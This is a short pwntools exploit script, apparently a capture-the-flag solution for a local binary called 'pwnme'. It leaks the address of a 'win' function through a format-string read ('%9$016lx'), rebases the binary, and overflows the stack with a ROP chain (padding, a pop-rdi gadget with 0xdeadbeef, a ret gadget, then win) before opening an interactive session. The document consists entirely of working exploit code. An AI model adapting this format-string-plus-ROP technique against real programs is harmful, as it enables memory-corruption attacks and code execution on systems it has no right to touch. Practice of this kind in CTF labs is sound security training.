from pwn import *

elf = context.binary = ELF("./pwnme")
p = process()

p.sendlineafter(b'?', b'%9$016lx')
leak = int(p.recv(16), 16)

elf.address = leak - elf.symbols.win
rop = ROP(elf)
info('Leak win = %s', hex(leak))

payload = flat(
    cyclic(40),
    rop.rdi.address,
    0xdeadbeef,
    rop.ret.address,
    leak,
)
p.sendline(payload)
p.interactive()

